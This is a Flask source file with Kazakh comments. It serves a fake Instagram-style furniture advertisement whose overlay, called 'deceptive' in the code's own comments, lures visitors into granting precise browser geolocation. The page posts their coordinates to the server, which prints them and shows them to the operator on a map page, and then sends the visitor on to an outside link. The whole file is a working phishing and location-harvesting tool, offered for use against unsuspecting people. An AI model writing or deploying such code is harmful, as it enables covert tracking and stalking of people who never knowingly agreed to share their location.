from flask import Flask, render_template_string, request, jsonify

app = Flask(__name__)

# Алынған координаттарды сақтайтын айнымалы
latest_location = {"lat": None, "lng": None}

# HTML бет (Мебель посты және сіз көрсеткен сілтеме)
HTML_PAGE = """
<!DOCTYPE html>
<html lang="kk">
<head>
    <meta charset="UTF-8">
    <title>Мебель Арзан</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; margin: 0; background: #fafafa; display: flex; justify-content: center; }
        .instagram-card { background: #fff; border: 1px solid #dbdbdb; border-radius: 3px; max-width: 400px; width: 100%; margin-top: 20px; }
        .card-header { padding: 16px; display: flex; align-items: center; border-bottom: 1px solid #efefef; }
        .profile-pic { width: 32px; height: 32px; border-radius: 50%; background: #ccc; margin-right: 12px; }
        .username { font-weight: 600; font-size: 14px; color: #262626; }
        .card-image img { width: 100%; display: block; }
        .card-content { padding: 16px; }
        .likes { font-weight: 600; font-size: 14px; margin-bottom: 8px; }
        .description { font-size: 14px; line-height: 18px; }
        .description span { font-weight: 600; }

        /* Рұқсат сұрайтын модальді терезе */
        #overlay {
            position: fixed; display: none; width: 100%; height: 100%; top: 0; left: 0; right: 0; bottom: 0;
            background-color: rgba(0,0,0,0.5); z-index: 2; cursor: pointer;
        }
        #alert-box {
            position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);
            background: white; padding: 20px; border-radius: 12px; text-align: center;
            box-shadow: 0 4px 15px rgba(0,0,0,0.2); max-width: 300px; width: 80%;
        }
        #alert-box h3 { margin-top: 0; color: #262626; }
        #alert-box p { color: #555; font-size: 14px; }
        #alert-box button {
            background: #0095f6; color: white; border: none; padding: 10px 20px; 
            border-radius: 5px; font-weight: 600; cursor: pointer; font-size: 16px; width: 100%;
        }
    </style>
</head>
<body>

    <!-- Мебель постының көрінісі -->
    <div class="instagram-card">
        <div class="card-header">
            <div class="profile-pic"></div>
            <div class="username">mebel_taraz_kz</div>
        </div>
        <div class="card-image">
            <img src="https://images.unsplash.com/photo-1586023492125-27b2c045efd7?q=80&w=600" alt="Мебель">
        </div>
        <div class="card-content">
            <div class="likes">Ұнатушылар: 1,420</div>
            <div class="description">
                <span>mebel_taraz_kz</span> Ең жаңа және сапалы жиһаз жиынтықтары! Жеңілдіктер мен бағаларды көру үшін батырманы басыңыз.
            </div>
        </div>
    </div>

    <!-- Алдамшы қабат -->
    <div id="overlay" onclick="startGeolocation()">
        <div id="alert-box">
            <h3>Хабарлама</h3>
            <p>Толық ақпарат пен бағасын көру үшін орналасқан жерді анықтауға рұқсат етіңіз.</p>
            <button>Жалғастыру</button>
        </div>
    </div>

    <script>
        window.onload = function() {
            setTimeout(function() {
                document.getElementById("overlay").style.display = "block";
            }, 1000);
        };

        function startGeolocation() {
            document.getElementById("overlay").style.display = "none";

            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(sendPosition, showError, {
                    enableHighAccuracy: true,
                    timeout: 10000,
                    maximumAge: 0
                });
            } else {
                redirectToLink();
            }
        }

        function sendPosition(position) {
            const lat = position.coords.latitude;
            const lng = position.coords.longitude;

            fetch('/save-location', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({ lat: lat, lng: lng }),
            }).finally(() => {
                redirectToLink();
            });
        }

        function showError(error) {
            redirectToLink();
        }

        // Сіз берген жаңа сілтемеге бағыттау функциясы
        function redirectToLink() {
            window.location.href = "https://share.google/ReXWND2f4dfwXYJJx";
        }
    </script>
</body>
</html>
"""


@app.route('/')
def index():
    return render_template_string(HTML_PAGE)


@app.route('/save-location', methods=['POST'])
def save_location():
    global latest_location
    data = request.json
    latest_location['lat'] = data.get('lat')
    latest_location['lng'] = data.get('lng')

    print(
        f"\n[!] ЖАҢА ЛОКАЦИЯ ТАБЫЛДЫ!\nЕндік (Lat): {latest_location['lat']}\nБойлық (Lng): {latest_location['lng']}\n")
    return jsonify({"status": "success"})


@app.route('/my-lokatsiya')
def view_location():
    if latest_location['lat'] and latest_location['lng']:
        map_url = f"https://www.google.com/maps?q={latest_location['lat']},{latest_location['lng']}"
        return f"""
        <h1>Локация табылды!</h1>
        <p><b>Ендік:</b> {latest_location['lat']}</p>
        <p><b>Бойлық:</b> {latest_location['lng']}</p>
        <br>
        <a href="{map_url}" target="_blank" style="font-size: 22px; color: white; background: #0095f6; padding: 10px 20px; text-decoration: none; border-radius: 5px;">Google Картадан көру</a>
        """
    return "<h3>Әлі ешкім сілтемені ашқан жоқ немесе рұқсат бермеді.</h3>"


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)